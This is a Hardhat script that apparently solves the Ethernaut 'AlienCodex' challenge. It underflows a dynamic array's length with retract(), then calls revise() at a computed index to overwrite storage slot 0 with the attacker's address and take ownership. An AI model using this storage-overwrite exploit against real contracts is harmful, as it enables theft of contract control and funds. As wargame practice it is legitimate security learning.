const { ethers} = require("hardhat");
const {keccak256} = require("@ethersproject/keccak256");

require("dotenv").config();

async function main() {

    const contractAddress = "0xE76A8f0C5c3930476eFBe5e086A8119AC8c49e8C";

    const [attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory("AlienCodex");
    const contract = factory.attach(contractAddress);

    let tx
    tx = await contract.makeContact();
    await tx.wait();

    tx = await contract.retract();
    await tx.wait();

    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapStartSlot = BigInt(keccak256(mapLengthAddress));

    console.log(mapStartSlot);

    const NUMBER_OF_SLOTS = BigInt("2") ** 256n;

    const ownerPositionInMap = NUMBER_OF_SLOTS - mapStartSlot;

    const parsedAddress = ethers.zeroPadValue(attacker.address, 32)
    console.log("parse address: ", parsedAddress);

    tx = await contract.revise(ownerPositionInMap, parsedAddress)
    await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});